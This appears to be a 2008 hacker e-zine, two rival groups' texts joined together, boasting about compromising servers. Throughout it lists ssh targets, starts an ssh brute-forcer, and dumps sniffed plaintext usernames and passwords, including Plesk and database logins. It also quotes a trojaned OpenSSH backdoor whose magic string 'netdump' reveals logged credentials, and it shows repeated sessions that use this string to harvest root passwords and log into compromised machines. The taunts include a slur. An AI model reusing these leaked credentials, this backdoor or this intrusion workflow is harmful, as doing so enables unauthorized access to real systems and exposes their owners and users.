ssh oracle@80.190.230.26
ssh oracle@80.249.110.130
ssh oracle@80.250.178.89
ssh oracle@80.251.163.21
ssh oracle@80.65.128.175
ssh oracle@209.84.255.105
ssh oracle@58.120.225.124
ssh oracle@63.209.12.251
ssh oracle@68.167.115.234
ssh oracle@58.120.225.124
ssh oracle@72.244.100.245
ssh oracle@58.120.225.124
ssh oracle@68.167.115.234
ssh oracle@63.120.68.100
ssh oracle@63.136.1.22
ssh oracle@91.103.96.18
ssh oracle@68.178.81.200
ssh oracle@82.110.102.235
ssh oracle@82.110.214.40
ssh oracle@82.102.93.4
ssh oracle@81.95.128.1
ssh oracle@81.95.128.11
ssh oracle@78.90.100.203
ssh oracle@80.249.110.130
ssh oracle@80.250.178.89
ssh oracle@80.251.163.21
ssh oracle@209.84.255.105
ssh oracle@63.123.44.22
ssh oracle@139.102.15.28
ssh oracle@128.175.13.183
ssh oracle@193.86.200.120
ssh oracle@78.90.100.203
ssh oracle@82.110.102.235
ssh oracle@82.94.199.146
ssh oracle@82.147.71.143
ssh oracle@129.173.66.56
ssh oracle@128.59.59.62
ssh oracle@72.83.128.115
ssh oracle@139.102.15.28
ssh oracle@128.59.59.62
ssh oracle@72.83.128.115
ssh oracle@128.175.13.183
ssh oracle@12.111.69.145
ssh oracle@128.175.13.183
ssh oracle@12.111.69.145
ssh oracle@72.244.100.245
ssh oracle@80.190.230.26
ssh oracle@139.102.15.28
ssh oracle@casaba.cc.columbia.edu
ssh oracle@128.59.59.62
ssh oracle@139.102.15.28
ssh oracle@139.102.15.33
ssh oracle@139.102.15.28
ssh root@213.239.174.129
ssh math402@master.queensu.ca
ssh math402@mast.queensu.ca
ssh root@74.221.128.106
ssh root@213.239.174.129
ssh math402@mast.queensu.ca
ssh oracle@129.173.66.56
ssh 213.239.174.129 -l root
ssh oracle@209.5.106.100
ssh oracle@209.84.255.104
ssh oracle@209.84.255.104
ssh oracle@209.84.255.105
ssh oracle@130.89.1.65
ssh oracle@130.192.112.103
ssh oracle@130.60.68.125
ssh oracle@194.204.32.101
ssh oracle@80.251.163.21
ssh oracle@80.250.178.89
ssh oracle@80.249.110.130
ssh oracle@80.190.230.26
ssh oracle@82.102.93.4
ssh oracle@80.65.128.175
ssh oracle@82.147.130.245
ssh oracle@80.65.128.175
ssh oracle@82.102.93.4
ssh oracle@80.190.230.26
ssh oracle@80.249.110.130

bash# nohup ./brute list >> /dev/null &

l0000000000lll




((((((((((((((( OKAY I WILL PASTE NOW SOME SNIFF LOGS ))))))))))))))))))))))


#COOL CORPORATION OF EFNET GOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOD

66.109.20.52/corp.efnet.net (stevoo:1qaz,2wsx) (venial:n1gg0rv3n) - FreeBSD corp.efnet.net 6.3-STABLE FreeBSD 6.3-STABLE #0: Fri Feb  8 21:24:16 UTC 2008     root@corp.efnet.net:/usr/obj/usr/src/sys/corp  i386 | cat /home/venial/psybnc/lang/french.lng

72.20.13.30/box.observers.net (venial:n1gg0rv3n) (coldfyre:qksq90a) - FreeBSD box.observers.net 6.1-RELEASE-p10 FreeBSD 6.1-RELEASE-p10 #7: Mon Oct 23 15:14:33 PDT 2006     root@box.observers.net:/usr/obj/usr/src/sys/obs  i386

85.24.148.29/evilbsd.com (venial:n1gg0rv3n) - FreeBSD epic.xzibition.com 5.4-RELEASE-p16 FreeBSD 5.4-RELEASE-p16 #1: Sat Jun 17 00:03:34 CEST 2006     root@epic.outlandz.net:/usr/obj/usr/src/sys/EPIC i386 i386 Intel(R) Pentium(R) 4 CPU 3.00GHz FreeBSD

72.20.48.65/echo.xzibition.com (venial:n1gg0rv3n) - FreeBSD echo.xzibition.com 6.1-RELEASE-p10 FreeBSD 6.1-RELEASE-p10 #1: Fri Nov  3 23:59:29 UTC 2006     root@echo.outlandz.net:/usr/obj/usr/src/sys/ECHO  i386

212.71.19.102/users.geekshells.org (venial:n1gg0rv3n) - FreeBSD spark.ofloo.net 6.3-RELEASE-p1 FreeBSD 6.3-RELEASE-p1 #11: Sun Feb 17 13:18:10 CET 2008     ofloo@spark.ofloo.net:/usr/obj/usr/src/sys/OFL  i386

& THKX VENIAL*********************









[root@x0x0x ~]# ssh accord.lyms.org -l smyl
smyl@accord.lyms.org's password: ^(x187

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ sudo su root
Password: xxxxxx

bash# uname -a
FreeBSD accord.lyms.org 6.2-RELEASE-p5 FreeBSD 6.2-RELEASE-p5 #0: Fri Jun 15 11:27:14 PDT 2007     root@accord.lyms.org:/usr/obj/usr/src/sys/FOO  i386
bash# exit






@#@#@###@#@ smyl you are really expert... making password of nsdfix.accesshost.us same as accord.lyms.org!! thks very much!!@#@@#@#@##@#@#



[root@x0x0x ~]# ssh nsdfix.accesshost.us -l smyl
smyl@nsdfix.accesshost.us's password: ^(x187

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ sudo su root
Password: xxxxxx

bash# uname -a
Linux nsdfix.accesshost.us 2.6.18-6-486 #1 Sun Feb 10 22:06:33 UTC 2008 i686 GNU/Linux
bash# exit






#@#@#@##@ OKAY... dont try change ur password!! i will hack again...



[root@x0x0x ~]# ssh 64.18.144.130 -l smyl
smyl@64.18.144.130 's password: ^(x187

Last login: xxxxxxxxxxxxxxxxxxxxxxxxxx

bash$ sudo su root
Password: xxxxxx


// (dak- owned ?)


bash# cat /etc/passwd|grep dak|wc -l
1
bash# uname -a
FreeBSD rock.accessshells.us 6.1-RELEASE FreeBSD 6.1-RELEASE #0: Thu Oct 18 20:45:44 EDT 2007     root@rock.accessshells.us:/usr/obj/usr/src/sys/LSD  i386
bash# exit





;;;;;;;...........

   ___      ___             
  /   \____/   \   NO WOMAN 
 /    / __ \    \   NO BALLS
/    |  ..  |    \          
\___/|      |\___/\         
   | |_|  |_|      \        
   | |/|__|\|       \       
   |   |__|         |\      
   |   |__|   |_/  /  \     
   | @ |  | @ || @ |   '    
   |   |~~|   ||   | HF     
   'ooo'  'ooo''ooo'        



cat somesniff_log;

<Smoracle> the domain for dev: dredgemedia.org, un: dredgemediaorg pass: g3u5nonwrp
<Smoracle> plesk login: https://dredgemedia.org:8443
<Smoracle> db name: pu   username: dredge_pu_dev   pass: ip35jrt24



.......................(dont worry, be happy!) l0l







staring on x0x0x2;


          -----------
         ´           `
        ´         - monstershells
       ´         ´
      ´      phisher1
     ´          o 
    ´           |
   |           / \                    hub.us.quakenet.org         __ *webguidepartner.com
   |- efnet - /   \               ---´                     sonny ´                 
   ´         /     \             ´                    ----´
dukat+-------       -------+stevoo    efnet.port80.se´
         \   \union/   /         `---´
         /   /     \   \                                                 
venial+-----        -----+smyl/dak   some shells
   `-                            `---´
     `some shells



                              /       /
                           .'<_.-._.'<
                          /           \      .^.
        ._               |  -+- -+-    |    (_|_)
     r- |\                \   /       /      // 
   /\ \\  :                \  -=-    /       \\
    `. \\.'           ___.__`..;._.-'---...  //
      ``\\      __.--""        `;'     __   `-.  
        /\\.--""""      __.,              """"-.  "".
        ;=r    __.---""   | `__    __'   / .'  .'
        '=/\\""""           \             .'  .'
            \\             |  __ __    /   |
             \\            |  -- --   //`'`'
              \\           |  -- --  ' | //
               \\          |    .      |// r.s.t.

~> messages

    (*) stevoo            - Open your eyes is a good way to avoid punches! (see stevoo picture, to understand this, LOL)
    (*) phisher1          - You are easy! think this. learn more www.linux.org/lessons/.
    (*) smyl              - Teach about security lol http://apex.vtc.com/linux-security.php.
    (*) venial            - We like you, but don´t be kiddie.
    (*) dubkat            - You are 100% pwned, keed quiet.
    (*) ik                - Do not be shown. We wont make fun about you.
    (*) misery            - As you asked, your nick dont be here! Do not make to be :) !
    (*) dtr               - NEXT TARGET!
    (*) dmer [at] brlink  - Open your eyes.
    (*) ?                 - Don´t keep in us way.


*'no much patience to do this zine'*



^^^^^^^ ^^^^^^^ ^^^^^^^ ^^^^^^^   ^^^^^^^
^^^^^^^ thkx to #soldiers @ efnet ^^^^^^^ 
^^^^^^^        g.  and      	  ^^^^^^^ 
^^^^^^^       all blackhats!  	  ^^^^^^^ 
^^^^^^^ ^^^^^^^ ^^^^^^^ ^^^^^^^   ^^^^^^^


# x0x0x r. - s. - t.
#
# wanna send us a message? x0x0xcr3w [at] gmail [dot] com
#
# EOF"
Papers,LabSec Industries - x0x0x exposed,eZine,,2008-03-01,: N/A,"#!/labsec/v/for/vendetta:book1-x0x0x
######################################################################################################################
#                                                                                                                    #
#                    .____          ___.     _________                                                               #
#                    |    |   _____ \_ |__  /   _____/ ____   ____                                                   #
#                    |    |   \__  \ | __ \ \_____  \_/ __ \_/ ___\                                                  #
#                    |    |___ / __ \| \_\ \/        \  ___/\  \___                                                  #
#                    |_______ (____  /___  /_______  /\___  >\___  >                                                 #
#                            \/    \/    \/        \/     \/     \/                                                  #
#                    .___            .___              __         .__                                                #
#                    |   | ____    __| _/_ __  _______/  |________|__| ____   ______                                 #
#                    |   |/    \  / __ |  |  \/  ___/\   __\_  __ \  |/ __ \ /  ___/                                 #
#                    |   |   |  \/ /_/ |  |  /\___ \  |  |  |  | \/  \  ___/ \___ \                                  #
#                    |___|___|  /\____ |____//____  > |__|  |__|  |__|\___  >____  >                                 #
#                             \/      \/          \/                      \/     \/                                  #
#                                                                                                                    #
#                                                                                                                    #
#         - presents:                                                                                                #
#         \- x0x0x exposed -/                                                                                        #
#                                                                                                                    #
######################################################################################################################
#                                                               #
#                                                               #
#        chapter one   : random lame stuff                      #
#        chapter two   : owned by yourself                      #
#        chapter three : download files/sniffs/stuff            #
#        chapter four  : conclusion                             #
#                   - x0x0x -                                   #
#                                                               #
#                                                               #
# - [V]endetta.                                                 #
#                                                               #
#################################################################


- <l> hello everyone !
- <l> the reason of this zine(which by teh way we dont like) is: vendetta >:)
- <l> we've got ourselfs owned around sep~2007 by the most lamer guys on brazil: r4t and his boyfriend skotch.(x0x0x)
- <l> now it's vendetta time !


#################################################################
#                                                               #
#                                                               #
#            _              _                                   #
#         __| |_  __ _ _ __| |_ ___ _ _   ___ _ _  ___          #
#        / _| ' \/ _` | '_ \  _/ -_) '_| / _ \ ' \/ -_)         #
#        \__|_||_\__,_| .__/\__\___|_|   \___/_||_\___|         #                 
#                      |_|                                      #
#                                                               #
#                                                               #
#################################################################


first of all, lets introduce x0x0x, the most pseudo-hackers of efnet: r47(r4t) and skotch(also known by s0l4r1s(nice nick btw))

[1]; http://archives.neohapsis.com/archives/fulldisclosure/2007-09/att-0178/x0x0x.txt
[2]; http://lasercomb.de/x0x0x2.txt

have you noticed how lame they are ?

all they can & will ever do is change your openssh version to a cracked one
and pray that the users will log into some kool server

and guess what, its NOT EVEN MADE by them ! - lets check it out -

central@labsec [~xoxox/openssh-4.7p1] # more skynet.h 
/*

                    
                            ### #  ### ##   ###  ##  ### ###  ######  ######  
                            ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
                            ####    ###       ####    ### #    ####     ##     
                              ###   ####       ##     #####    ##       ##        
                            #  ##   ## ##      ##     ## ##    ## ##    ##        
                            ####   #### ##    ####   ### ##   ######   ####    

                                        - V E R S I O N  1. 0 -
                                             coded by fmrj
                                              11.01.2008


  Features:
  - Logs SSH, SCP, SFTP, SSHD and ip / hostname 
  - ftp logger included (netkit-ftp)
  - Encrypted sniffer logs
  - SSH, SCP, SFTP will not log you
  - compile script (see compile.sh)
  - rootlogin is permitted even though remoterootlogin is set to no
  - Will not log to syslog, utmp, wtmp or lastlog
  - If MAGIC_VERSION is NOT undeclared:
    telnet -hackedbox- 22 and type MAGIC_VERSION will show logs without you having to log in.
    (WARNING: telnet does NOT encrypt like SSH, so this would be visible with tcpdump)
    Also this will NOT get logged by syslog
    
  
  Future features:
  - pid hiding
  - More encryption / better sniffer encryption (thought of rc-crypt)
  - strace will show that ssh is logging, make it so that if ssh is being ptrace'd it will not log
  - Have a cool PS1 for the bd
  - Write a ssh client that can:
    -> Connect and dump logs so you dont have to use telnet approach (encrypted)
    -> That can do connect-chain (ssh -bounce box1 box2 box3)

  
  If you have this, it either means we are friends or someone gave it to you, if so
  I would like this bd to be kept as private as possible, so please dont pass it on

  I would also appreciate suggestions / ideas / help / whatever for future features 
  aim: fmrj09


  - Thanks * 

*/

- then there is some shit aion code which is public @ packetstorm - 
- their kool sshd backdoor kan be found in the end of thiz zine   -
- dont forget to check the gr8 shellscript skotch made            -

################################## leTz hIghTlIghT 50m3th1n6 #############################
    telnet -hackedbox- 22 and type MAGIC_VERSION will show logs without you having to log in.
################################## LETS HIGHLIGHT SOMETHING #############################

ohhhhhhwwwwwwww. k00l 3n0ugh !
and gu355 wh47 ?
th3y u53 th3 s4m3 m4g1c_v3r510n 1n 4ll th31r k00l l4m3 53rv3r5 !

*thinks* is that a deja-vu or something ? i could swear that x0x0x wrote something about it in our zine ! *thinks* 


central@labsec [~xoxox/openssh-4.7p1] # grep -i magic_version skotch.h
#define MAGIC_VERSION		""netdump""


----- th4nk5 8uddY ------
----- end of lame sshd backdor ----

***************** phalanx the gr8 kernel rootkit ***************

7h475 r1gh7. l4m3 55hD b4ckd00R wasnT ENouGH !
whAT ELsE Do thEY USE ?

PHALANX ! THE gr8 prIv8 kERn3l r007k17
get your own at http://packetstormsecurity.org/UNIX/penetration/rootkits/phalanx-b6.tar.bz2

* attached their k00l phalanx in the bottom of the zine *

***************** phalanx the gr8 kernel rootkit ***************

------ funny stuff:

while looking at their boxes, we felt so disappointed that they cant even write the right sshd version..

[139.82.95.11:22]     : SSH-2.0-p2-FC-4.3
[212.200.96.150:22]   : SSH-2.0-OpenSSH_4.3p2, OpenSSL 0.9.8b 04 May 2006
[216.75.56.186:22]    : SSH-2.0-OenSSH_4.2
[140.122.141.164:2174]: SSH-2.0-p1 Debian-5ubuntu0.5
[143.107.250.214:22]  : SSH-1.99-p1
[201.62.131.185:22]   : SSH-2.0-p1 Debian-8ubuntu1.2
[200.144.189.17:22]   : SSH-1.99-p1

you must be asking yourself.. wtf? they cant even copy&paste the right sshd version, how do they own so many servers?
answer: bad system admins. doing a easy md5 checksum on ssh/sshd binaries would do the trick. they dont even check their sshd banners.


[[[[[[[[[[[[[[ fAsT rESUMe oF chApTER oNE ]]]]]]]]]]]]]
they suck. they beg for someone to code them some lame kernel rootkit (phalanx) and sshd backdoor which is... around ~90's ? we no longer use them, k ?
they blame us about using the same password, what about thei magic_password ? kool, they use the 'netdump' on all their boxes,
which is the reason for the chapter two.
[[[[[[[[[[[[[[ fAsT rESUMe oF chApTER oNE ]]]]]]]]]]]]]

#################################################################
#                                                               #
#            __             __            __                    #
#       ____/ /  ___ ____  / /____ ____  / /__    _____         #
#      / __/ _ \/ _ `/ _ \/ __/ -_) __/ / __/ |/|/ / _ \        #
#      \__/_//_/\_,_/ .__/\__/\__/_/    \__/|__,__/\___/        #
#                  /_/                                          #
#                                                               #
#                                                               #
#################################################################

; thiZ iZ WhErE wE StaRT tO SHoW ThEiR kOoL & niCe laMe ServeRS
; 90% oF thEm, thEY Got ThRU SsH SNiFfER WHiCh Is Not KoOL
; and 10% oF thEM, thEY gOT thRu SsHbRutEfoRce WhicH iZ VErY koOl
;
; thAnkZ agAIN MaGiC_vERSIoN ANd ThAnks foR BeInG DuMbER thAn wE usEd to BE




central@labsec [~xoxox/h3h3] # telnet 189.3.219.4 22
Trying 189.3.219.4...
Connected to 189.3.219.4 (189.3.219.4).
Escape character is '^]'.
SSH-2.0-OpenSSH_4.7
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> r3m3mb3r th1Z:;;;;;///
SSH2_OUT: 127.0.0.1     user: root      pass: R4tD33Gl  (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> thanks for ssh localhost dewd
- cut-

******************** th4nk5 f0r 7h3 p455w0rd 7hRu y0uR 0w|\| |_4m3 5n1ff3r, 455h0l3 ********************
central@labsec [~xoxox/h3h3] # ssh root@189.3.219.4          
root@189.3.219.4's password: 



Last login: Fri Aug  8 16:27:40 2008 from 189.4.161.222


                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux servnet 2.6.18-4-486 i686 ****

root@servnet:~#
root@servnet:~# uname -a;/sbin/ifconfig -a|grep inet
Linux servnet 2.6.18-4-486 #1 Wed Apr 18 09:13:09 UTC 2007 i686 GNU/Linux
          inet addr:189.3.219.4  Bcast:189.3.219.63  Mask:255.255.255.192

root@servnet:~# last -1 root
root     pts/2        189.4.161.222    Fri Aug  8 16:27 - 16:32  (00:04)
222.161.4.189.in-addr.arpa domain name pointer bd04a1de.virtua.com.br.


******************** 1 w0nd3r h0w 0ld 55h brut3f0rc3 1z ********************
-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 91.199.207.141 22
Trying 91.199.207.141...
Connected to 91.199.207.141.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.3
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> you have no idea how kool you are
SSH2_OUT: 127.0.0.1     user: root      pass: buCeTTT   (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> oh, thanks.
pass_from: 91.199.207.142       user: root      pass: salinarsalinar    (x2.sprintdns.net) -->>>>>>>>>> i hope you guys change the passwd real quick :)

central@labsec [~xoxox/h3h3] # ssh root@91.199.207.141
root@91.199.207.141's password: 

Last login: Sun Aug 10 12:17:11 2008 from 97.139.broadband2.iol.cz

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux x1 2.6.18-6-686 i686 ****

root@x1:~# 
root@x1:~# uname -a;w;last -1 root
Linux x1 2.6.18-6-686 #1 SMP Sat May 24 10:24:42 UTC 2008 i686 GNU/Linux
 08:24:44 up 9 days, 14:48,  0 users,  load average: 0.17, 0.11, 0.09
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0        97.139.broadband Sun Aug 10 12:17 - 12:38  (00:20)    
root@x1:~# ifconfig -a|grep inet
          inet addr:91.199.207.141  Bcast:91.199.207.255  Mask:255.255.255.0

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] #  telnet 195.91.248.58 22
Trying 195.91.248.58...
Connected to 195.91.248.58.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.7
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> hi. im a pseudo hacker
SSH2_OUT: 127.0.0.1     user: root      pass: DiVRuu    (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> ok, get in.


central@labsec [~xoxox/h3h3] # ssh root@195.91.248.58
root@195.91.248.58's password: 

Last login: Mon Aug 11 13:00:20 2008 from ppp85-140-31-214.pppoe.mtu-net.ru

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux localhost 2.6.24-gentoo-r3 i686 ****

localhost ~ # 
localhost ~ # uname -a;w;last -1 root;/sbin/ifconfig -a|grep inet
Linux localhost 2.6.24-gentoo-r3 #3 SMP Mon Apr 7 18:52:13 Local time zone must be set--see zic m i686 Intel(R) Core(TM)2 Duo CPU     E4500  @ 2.20GHz GenuineIntel GNU/Linux
 10:30:35 up 1 day, 22:21,  0 users,  load average: 0.15, 0.12, 0.09
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/1        ppp85-140-31-214 Mon Aug 11 13:00 - 13:07  (00:06)    

wtmp begins Mon Mar 31 21:49:08 2008
          inet addr:195.91.248.58  Bcast:195.91.248.63  Mask:255.255.255.240

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 195.71.126.86 22
Trying 195.71.126.86...
Connected to 195.71.126.86.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.2
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> y0, im leet.
pam_from: 91.128.212.13         user: root      pass: w22662s   (d91-128-212-13.cust.tele2.at) ---->>>> no localhost this time(yay!) but it works.

central@labsec [~xoxox/h3h3] # ssh root@195.71.126.86
root@195.71.126.86's password: 

root@BHC2:/usr/local# uname -a;w;/sbin/ifconfig -a|grep inet
Linux BHC2 2.6.15 #7 SMP PREEMPT Sun Feb 19 23:35:17 CET 2006 i686 GNU/Linux
 08:34:52 up 42 days, 19:58,  3 users,  load average: 0,91, 1,05, 1,07
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/39   chello0841120232 Sat00    3days  0.93s  0.89s mc
root     pts/5    chello0841120232 Fri09    2days  0.01s  0.01s -bash
root     pts/7    chello0841120232 Fri23    2days  1:20   1:20  mc
          inet Adresse:195.71.126.86  Bcast:195.71.126.95  Maske:255.255.255.240

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 152.66.208.100 22
Trying 152.66.208.100...
Connected to 152.66.208.100.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.3
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> there i am.
SSH2_OUT: 127.0.0.1     user: joeb      pass: xaoAs..   (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> sup joeb
pass_from: 78.131.80.171        user: joeb      pass: milegyen  (78-131-80-171.pool.hdsnet.hu)        > better be changing that by now.
SSH2_OUT: 78.131.80.171         user: joeb      pass: megistudom        (78-131-80-171.pool.hdsnet.hu)> better be changing that by now.
SSH2_OUT: 84.2.126.154  	user: joeb      pass: valami    (dsl54027E9A.pool.t-online.hu)        > better be changing that by now.

central@labsec [~xoxox/h3h3] # ssh root@152.66.208.100
root@152.66.208.100's password: 

Last login: Wed Aug 13 08:29:00 2008 from 78-131-80-171.pool.hdsnet.hu

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux maszat 2.6.18-6-686-bigmem i686 ****

root@maszat:~#
root@maszat:~# uname -a;w;/sbin/ifconfig -a|grep inet
Linux maszat 2.6.18-6-686-bigmem #1 SMP Fri Jun 6 23:31:15 UTC 2008 i686 GNU/Linux
 08:41:36 up 25 days, 16:08,  0 users,  load average: 0.19, 0.15, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
          inet addr:152.66.208.100  Bcast:152.66.208.127  Mask:255.255.255.128
          inet6 addr: 2001:738:2001:2072:207:e9ff:fe24:4236/64 Scope:Global

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 147.46.242.9 22
Trying 147.46.242.9...
Connected to 147.46.242.9.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.7
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> afterall, why netdump ?
SSH2_OUT: 127.0.0.1     user: root      pass: NjKeyJ    (localhost)  --------->>>>>>>>>>>>>>>>>>>>>>>>> hello sw337Y.
pass_from: 147.46.242.52        user: dreameye  pass: ii1945    (ropas.snu.ac.kr)  ------>>>>>>>>>>>>>> sorry koreans, nothing personal.
pass_from: 211.48.102.167       user: dk        pass: 0ghafjs                      ------>>>>>>>>>>>>>> i mean, personal with you, you no.

central@labsec [~xoxox/h3h3] # ssh root@147.46.242.9
root@147.46.242.9's password: 

Last login: Thu Aug  7 03:35:51 2008 from ropas.snu.ac.kr

                            **** Connected to ****              

               ### #  ### ##   ###  ##  ### ###  ######  ######   
               ##  #   ## #     ##  ##   ##  #    ##    # # ## #  
               ####    ###       ####    ### #    ####     ##     
                 ###   ####       ##     #####    ##       ##     
               #  ##   ## ##      ##     ## ##    ## ##    ##     
               ####   #### ##    ####   ### ##   ######   #### 1.0
                 **** Linux abs 2.6.24-19-server i686 ****

root@abs:~#
root@abs:~# uname -a;w;/sbin/ifconfig -a|grep inet;last -1 dreameye
Linux abs 2.6.24-19-server #1 SMP Sat Jul 12 00:40:01 UTC 2008 i686 GNU/Linux
 15:49:37 up 8 days,  1:53,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
          inet addr:147.46.242.9  Bcast:147.46.242.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:e8ff:fef8:8760/64 Scope:Link
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
dreameye pts/0        ropas.snu.ac.kr  Thu Aug  7 03:35 - 03:36  (00:00) 

-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 200.160.119.92 8022       ----- same applies for 200.160.119.93 (another dumbox on the network)
Trying 200.160.119.92...
Connected to 200.160.119.92.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.3
netdump                                                              --------->>>>>>>>>>>>>>>>>>>>>>>>> has it something to do with my netdump user?
pass_from: 192.168.100.231      user: root      pass: m4c4c0z3e1        (tradestation231.eum.intranet)> hello m0nk3y

central@labsec [~xoxox/h3h3] # ssh root@200.160.119.92 -p 8022
root@200.160.119.92's password: 

******* no skynet thiz timE *********** h3h3h3h3 ***********

Last login: Mon Aug 11 21:48:01 2008 from tradestation231.eum.intranet
root@eumisrvgw2:~# 
root@eumisrvgw2:/usr/local/temp# uname -a;w;/sbin/ifconfig -a|grep inet
Linux eumisrvgw2 2.6.18-6-686 #1 SMP Fri Jun 6 22:22:11 UTC 2008 i686 GNU/Linux
 03:18:45 up 24 days,  9:43,  0 users,  load average: 0.01, 0.03, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
          inet addr:192.168.100.242  Bcast:192.168.100.255  Mask:255.255.255.0
          inet6 addr: fe80::219:bbff:fec6:82b6/64 Scope:Link
          inet addr:192.168.200.254  Bcast:192.168.200.255  Mask:255.255.255.0
          inet addr:200.160.119.92  Bcast:200.160.119.95  Mask:255.255.255.240
          inet6 addr: fe80::219:bbff:fec6:82b7/64 Scope:Link
          inet addr:200.169.223.172  Bcast:200.169.223.175  Mask:255.255.255.248

root@eumisrvgw2:~# last -10 root|grep 189\.4
root     pts/0        189.4.161.222    Mon Aug 11 14:24 - 14:44  (00:19)   ----------------------->>>>> i wonder who that kool ip iz.
                                                                           ----------------------->>>>> bruteforce again? what a zhame !
-/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\-

central@labsec [~xoxox/h3h3] # telnet 200.20.9.67 22
Trying 200.20.9.67...
Connected to 200.20.9.67.
Escape character is '^]'.
SSH-2.0-OpenSSH_4.3
netdump
SSH2_OUT: 127.0.0.1     user: root      pass: vEcTrrA   (localhost)

central@labsec [~xoxox/h3h3] # ssh root@200.20.9.67 -p 8022
root@200.20.9.67's password: 

root@ssh1:~# uname -a;uptime;/sbin/ifconfig -a|grep inet
